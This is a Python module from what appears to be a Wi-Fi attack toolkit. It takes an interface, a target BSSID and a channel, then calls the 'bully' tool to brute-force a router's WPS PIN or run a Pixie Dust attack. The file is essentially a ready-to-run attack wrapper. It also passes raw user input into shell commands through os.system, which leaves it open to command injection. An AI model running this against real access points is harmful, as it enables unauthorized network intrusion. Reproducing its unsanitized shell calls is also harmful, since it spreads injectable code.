# wifisploit/modules/wps_attack.py

import os
from pystyle import Colorate, Colors
from colorama import init
init(autoreset=True)

gradient_colors = Colors.red_to_white

interface = input(Colorate.Horizontal(gradient_colors, "wsf (Interface) > "))
if interface.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"Interface => {interface}"))

bssid = input(Colorate.Horizontal(gradient_colors, "wsf (BSSID) > "))
if bssid.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"BSSID => {bssid}"))

channel = input(Colorate.Horizontal(gradient_colors, "wsf (Channel) > "))
if channel.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"Channel => {channel}"))

user = input(Colorate.Horizontal(gradient_colors, "\nDo you have PIN? [y/N] "))
if user.lower() in ["y", "yes"]:
    pin = input(Colorate.Horizontal(gradient_colors, "wsf (PIN) > "))
    if pin.lower() == "back":
        quit()
    else:
        print(Colorate.Horizontal(gradient_colors, f"PIN => {pin}"))
    os.system(f"bully -b {bssid} -c {channel} --bruteforce -p {pin} {interface}")
else:
    os.system(f"bully -b {bssid} -c {channel} --force --pixiewps {interface}")